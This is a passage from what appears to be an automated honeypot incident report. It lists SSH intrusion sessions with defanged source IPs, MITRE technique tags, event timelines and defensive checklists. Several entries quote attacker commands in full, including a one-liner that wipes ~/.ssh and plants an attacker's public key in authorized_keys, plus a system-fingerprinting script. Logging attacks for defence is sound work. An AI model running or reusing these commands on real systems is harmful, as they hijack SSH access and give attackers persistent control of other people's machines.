| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.command.success` |
| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.command.input` |
| `2026-07-22 06:16:54` | `cowrie.log.closed` |
| `2026-07-22 06:16:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-101dc82fd1b9

| Field | Detail |
|---|---|
| **Source IP** | `89.203.142[.]96` |
| **First Seen** | 2026-07-22 06:18 |
| **Last Seen** | 2026-07-22 06:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:18:27` | `cowrie.session.connect` |
| `2026-07-22 06:18:27` | `cowrie.client.version` |
| `2026-07-22 06:18:27` | `cowrie.client.kex` |
| `2026-07-22 06:18:28` | `cowrie.login.success` |
| `2026-07-22 06:18:28` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:18:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `89.203.142[.]96` to AbuseIPDB if not already reported
- [ ] Block `89.203.142[.]96` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b3b2fed8f00e

| Field | Detail |
|---|---|
| **Source IP** | `115.245.122[.]146` |
| **First Seen** | 2026-07-22 06:18 |
| **Last Seen** | 2026-07-22 06:18 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:18:33` | `cowrie.session.connect` |
| `2026-07-22 06:18:34` | `cowrie.client.version` |
| `2026-07-22 06:18:34` | `cowrie.client.kex` |
| `2026-07-22 06:18:36` | `cowrie.login.success` |
| `2026-07-22 06:18:36` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:18:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `115.245.122[.]146` to AbuseIPDB if not already reported
- [ ] Block `115.245.122[.]146` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fc4cd6559fa0

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]71` |
| **First Seen** | 2026-07-22 06:18 |
| **Last Seen** | 2026-07-22 06:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:18:55` | `cowrie.session.connect` |
| `2026-07-22 06:18:56` | `cowrie.client.version` |
| `2026-07-22 06:18:56` | `cowrie.client.kex` |
| `2026-07-22 06:18:57` | `cowrie.login.success` |
| `2026-07-22 06:18:58` | `cowrie.session.params` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.command.success` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.command.input` |
| `2026-07-22 06:18:58` | `cowrie.log.closed` |
| `2026-07-22 06:18:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]71` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]71` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beba751a5df3

| Field | Detail |
|---|---|
| **Source IP** | `114.98.63[.]18` |
| **First Seen** | 2026-07-22 06:22 |
| **Last Seen** | 2026-07-22 06:22 |
| **Session Duration** | 10s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:22:01` | `cowrie.session.connect` |
| `2026-07-22 06:22:02` | `cowrie.client.version` |
| `2026-07-22 06:22:03` | `cowrie.client.kex` |
| `2026-07-22 06:22:05` | `cowrie.login.success` |
| `2026-07-22 06:22:06` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:22:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `114.98.63[.]18` to AbuseIPDB if not already reported
- [ ] Block `114.98.63[.]18` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0f8cc40eba6f

| Field | Detail |
|---|---|
| **Source IP** | `136.56.34[.]147` |
| **First Seen** | 2026-07-22 06:22 |
| **Last Seen** | 2026-07-22 06:22 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:22:11` | `cowrie.session.connect` |
| `2026-07-22 06:22:11` | `cowrie.client.version` |
| `2026-07-22 06:22:11` | `cowrie.client.kex` |
| `2026-07-22 06:22:12` | `cowrie.login.success` |
| `2026-07-22 06:22:13` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:22:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `136.56.34[.]147` to AbuseIPDB if not already reported
- [ ] Block `136.56.34[.]147` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dc7d028c8405

| Field | Detail |
|---|---|
| **Source IP** | `122.227.103[.]254` |
| **First Seen** | 2026-07-22 06:23 |
| **Last Seen** | 2026-07-22 06:28 |
| **Session Duration** | 301s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh` |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:23:37` | `cowrie.session.connect` |
| `2026-07-22 06:23:37` | `cowrie.client.version` |
| `2026-07-22 06:23:37` | `cowrie.client.kex` |
| `2026-07-22 06:23:38` | `cowrie.login.success` |
| `2026-07-22 06:23:39` | `cowrie.session.params` |
| `2026-07-22 06:23:39` | `cowrie.command.input` |
| `2026-07-22 06:23:39` | `cowrie.command.failed` |
| `2026-07-22 06:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.227.103[.]254` to AbuseIPDB if not already reported
- [ ] Block `122.227.103[.]254` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eefbcdb2272e

| Field | Detail |
|---|---|
| **Source IP** | `218.26.205[.]154` |
| **First Seen** | 2026-07-22 06:24 |
| **Last Seen** | 2026-07-22 06:24 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:24:46` | `cowrie.session.connect` |
| `2026-07-22 06:24:47` | `cowrie.client.version` |
| `2026-07-22 06:24:47` | `cowrie.client.kex` |
| `2026-07-22 06:24:50` | `cowrie.login.success` |
| `2026-07-22 06:24:51` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:24:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.26.205[.]154` to AbuseIPDB if not already reported
- [ ] Block `218.26.205[.]154` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a2574137884

| Field | Detail |
|---|---|
| **Source IP** | `125.69.76[.]148` |
| **First Seen** | 2026-07-22 06:24 |
| **Last Seen** | 2026-07-22 06:25 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:24:56` | `cowrie.session.connect` |
| `2026-07-22 06:24:57` | `cowrie.client.version` |
| `2026-07-22 06:24:57` | `cowrie.client.kex` |
| `2026-07-22 06:24:59` | `cowrie.login.success` |
| `2026-07-22 06:25:00` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:25:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `125.69.76[.]148` to AbuseIPDB if not already reported
- [ ] Block `125.69.76[.]148` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c7d3a94fac90

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 06:25 |
| **Last Seen** | 2026-07-22 06:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:25:16` | `cowrie.session.connect` |
| `2026-07-22 06:25:16` | `cowrie.client.version` |
| `2026-07-22 06:25:16` | `cowrie.client.kex` |
| `2026-07-22 06:25:16` | `cowrie.login.success` |
| `2026-07-22 06:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f95ada80737d

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-22 06:25 |
| **Last Seen** | 2026-07-22 06:25 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:25:16` | `cowrie.session.connect` |
| `2026-07-22 06:25:16` | `cowrie.client.version` |
| `2026-07-22 06:25:16` | `cowrie.client.kex` |
| `2026-07-22 06:25:16` | `cowrie.login.success` |
| `2026-07-22 06:25:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-27b5660fdf40

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 06:27 |
| **Last Seen** | 2026-07-22 06:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:27:25` | `cowrie.session.connect` |
| `2026-07-22 06:27:25` | `cowrie.client.version` |
| `2026-07-22 06:27:25` | `cowrie.client.kex` |
| `2026-07-22 06:27:26` | `cowrie.login.success` |
| `2026-07-22 06:27:26` | `cowrie.session.params` |
| `2026-07-22 06:27:26` | `cowrie.command.input` |
| `2026-07-22 06:27:26` | `cowrie.log.closed` |
| `2026-07-22 06:27:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9a73b79525f1

| Field | Detail |
|---|---|
| **Source IP** | `120.52.18[.]141` |
| **First Seen** | 2026-07-22 06:28 |
| **Last Seen** | 2026-07-22 06:29 |
| **Session Duration** | 44s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:28:16` | `cowrie.session.connect` |
| `2026-07-22 06:28:22` | `cowrie.client.version` |
| `2026-07-22 06:28:22` | `cowrie.client.kex` |
| `2026-07-22 06:28:23` | `cowrie.login.success` |
| `2026-07-22 06:28:25` | `cowrie.session.params` |
| `2026-07-22 06:28:25` | `cowrie.command.input` |
| `2026-07-22 06:28:25` | `cowrie.command.failed` |
| `2026-07-22 06:28:25` | `cowrie.log.closed` |
| `2026-07-22 06:28:26` | `cowrie.session.params` |
| `2026-07-22 06:28:26` | `cowrie.command.input` |
| `2026-07-22 06:28:26` | `cowrie.session.file_download` |
| `2026-07-22 06:28:26` | `cowrie.log.closed` |
| `2026-07-22 06:29:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.18[.]141` to AbuseIPDB if not already reported
- [ ] Block `120.52.18[.]141` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4bad5b9f3c46

| Field | Detail |
|---|---|
| **Source IP** | `120.52.18[.]141` |
| **First Seen** | 2026-07-22 06:28 |
| **Last Seen** | 2026-07-22 06:28 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:28:34` | `cowrie.session.connect` |
| `2026-07-22 06:28:34` | `cowrie.client.version` |
| `2026-07-22 06:28:34` | `cowrie.client.kex` |
| `2026-07-22 06:28:37` | `cowrie.login.success` |
| `2026-07-22 06:28:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `120.52.18[.]141` to AbuseIPDB if not already reported
- [ ] Block `120.52.18[.]141` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c600719cd122

| Field | Detail |
|---|---|
| **Source IP** | `176.53.159[.]196` |
| **First Seen** | 2026-07-22 06:33 |
| **Last Seen** | 2026-07-22 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:33:07` | `cowrie.session.connect` |
| `2026-07-22 06:33:07` | `cowrie.client.version` |
| `2026-07-22 06:33:07` | `cowrie.client.kex` |
| `2026-07-22 06:33:07` | `cowrie.login.success` |
| `2026-07-22 06:33:07` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:33:07` | `cowrie.direct-tcpip.data` |
| `2026-07-22 06:33:08` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `176.53.159[.]196` to AbuseIPDB if not already reported
- [ ] Block `176.53.159[.]196` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3402f5873612

| Field | Detail |
|---|---|
| **Source IP** | `203.88.121[.]4` |
| **First Seen** | 2026-07-22 06:33 |
| **Last Seen** | 2026-07-22 06:33 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:33:40` | `cowrie.session.connect` |
| `2026-07-22 06:33:40` | `cowrie.client.version` |
| `2026-07-22 06:33:40` | `cowrie.client.kex` |
| `2026-07-22 06:33:40` | `cowrie.login.success` |
| `2026-07-22 06:33:41` | `cowrie.session.params` |
| `2026-07-22 06:33:41` | `cowrie.command.input` |
| `2026-07-22 06:33:41` | `cowrie.command.failed` |
| `2026-07-22 06:33:41` | `cowrie.log.closed` |
| `2026-07-22 06:33:42` | `cowrie.session.params` |
| `2026-07-22 06:33:42` | `cowrie.command.input` |
| `2026-07-22 06:33:42` | `cowrie.session.file_download` |
| `2026-07-22 06:33:42` | `cowrie.log.closed` |
| `2026-07-22 06:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.121[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.88.121[.]4` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-64aabeb36a86

| Field | Detail |
|---|---|
| **Source IP** | `203.88.121[.]4` |
| **First Seen** | 2026-07-22 06:33 |
| **Last Seen** | 2026-07-22 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:33:42` | `cowrie.session.connect` |
| `2026-07-22 06:33:42` | `cowrie.client.version` |
| `2026-07-22 06:33:42` | `cowrie.client.kex` |
| `2026-07-22 06:33:42` | `cowrie.login.success` |
| `2026-07-22 06:33:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.121[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.88.121[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a77cb7cd9424

| Field | Detail |
|---|---|
| **Source IP** | `203.88.121[.]4` |
| **First Seen** | 2026-07-22 06:33 |
| **Last Seen** | 2026-07-22 06:33 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:33:42` | `cowrie.session.connect` |
| `2026-07-22 06:33:42` | `cowrie.client.version` |
| `2026-07-22 06:33:42` | `cowrie.client.kex` |
| `2026-07-22 06:33:43` | `cowrie.login.success` |
| `2026-07-22 06:33:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `203.88.121[.]4` to AbuseIPDB if not already reported
- [ ] Block `203.88.121[.]4` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-43f7675fe90a

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-07-22 06:34 |
| **Last Seen** | 2026-07-22 06:34 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:34:56` | `cowrie.session.connect` |
| `2026-07-22 06:34:56` | `cowrie.client.version` |
| `2026-07-22 06:34:56` | `cowrie.client.kex` |
| `2026-07-22 06:34:56` | `cowrie.login.success` |
| `2026-07-22 06:34:57` | `cowrie.session.params` |
| `2026-07-22 06:34:57` | `cowrie.command.input` |
| `2026-07-22 06:34:57` | `cowrie.log.closed` |
| `2026-07-22 06:34:57` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e59a2a519ea0

| Field | Detail |
|---|---|
| **Source IP** | `90.230.168[.]26` |
| **First Seen** | 2026-07-22 06:39 |
| **Last Seen** | 2026-07-22 06:39 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:39:35` | `cowrie.session.connect` |
| `2026-07-22 06:39:36` | `cowrie.client.version` |
| `2026-07-22 06:39:36` | `cowrie.client.kex` |
| `2026-07-22 06:39:36` | `cowrie.login.success` |
| `2026-07-22 06:39:37` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:39:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `90.230.168[.]26` to AbuseIPDB if not already reported
- [ ] Block `90.230.168[.]26` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1827ceb90933

| Field | Detail |
|---|---|
| **Source IP** | `213.154.80[.]51` |
| **First Seen** | 2026-07-22 06:40 |
| **Last Seen** | 2026-07-22 06:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:40:39` | `cowrie.session.connect` |
| `2026-07-22 06:40:39` | `cowrie.client.version` |
| `2026-07-22 06:40:39` | `cowrie.client.kex` |
| `2026-07-22 06:40:40` | `cowrie.login.success` |
| `2026-07-22 06:40:41` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:40:45` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `213.154.80[.]51` to AbuseIPDB if not already reported
- [ ] Block `213.154.80[.]51` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-915e8f96fceb

| Field | Detail |
|---|---|
| **Source IP** | `31.173.66[.]222` |
| **First Seen** | 2026-07-22 06:40 |
| **Last Seen** | 2026-07-22 06:40 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:40:50` | `cowrie.session.connect` |
| `2026-07-22 06:40:50` | `cowrie.client.version` |
| `2026-07-22 06:40:50` | `cowrie.client.kex` |
| `2026-07-22 06:40:51` | `cowrie.login.success` |
| `2026-07-22 06:40:52` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:40:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `31.173.66[.]222` to AbuseIPDB if not already reported
- [ ] Block `31.173.66[.]222` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4f565a351ea8

| Field | Detail |
|---|---|
| **Source IP** | `189.52.52[.]162` |
| **First Seen** | 2026-07-22 06:43 |
| **Last Seen** | 2026-07-22 06:43 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-22 06:43:03` | `cowrie.session.connect` |
| `2026-07-22 06:43:04` | `cowrie.client.version` |
| `2026-07-22 06:43:04` | `cowrie.client.kex` |
| `2026-07-22 06:43:05` | `cowrie.login.success` |
| `2026-07-22 06:43:06` | `cowrie.direct-tcpip.request` |
| `2026-07-22 06:43:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `189.52.52[.]162` to AbuseIPDB if not already reported
- [ ] Block `189.52.52[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-76007c16c868

| Field | Detail |
|---|---|
| **Source IP** | `124.239.169[.]52` |
| **First Seen** | 2026-07-22 06:43 |
| **Last Seen** | 2026-07-22 06:43 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
